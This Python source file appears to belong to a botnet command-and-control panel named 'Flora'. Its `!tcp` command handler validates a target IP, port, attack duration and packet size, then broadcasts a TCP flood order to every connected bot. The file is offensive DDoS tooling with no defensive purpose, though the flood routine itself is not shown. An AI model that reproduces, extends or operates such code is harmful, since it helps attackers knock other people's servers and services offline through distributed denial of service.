import time
import socket
from   pytermx import Color

def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]

        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, f"{Color.BRIGHT_WHITE}Attack successfully sent to all {Color.GREY}Flora {Color.BRIGHT_WHITE}servers!")
                        broadcast(data)
                    else:
                        send(client, Color.BRIGHT_RED + "Invalid packet size (1-65500 bytes).")
                else:
                    send(client, Color.BRIGHT_RED + "Invalid attack duration (10-1300 seconds).")
            else:
                send(client, Color.BRIGHT_RED + "Invalid port number (1-65535).")
        else:
            send(client, Color.BRIGHT_RED + "Invalid IP-address.")
    else:
        send(client, Color.BRIGHT_RED + "Usage: !tcp [IP] [PORT] [TIME] [SIZE]")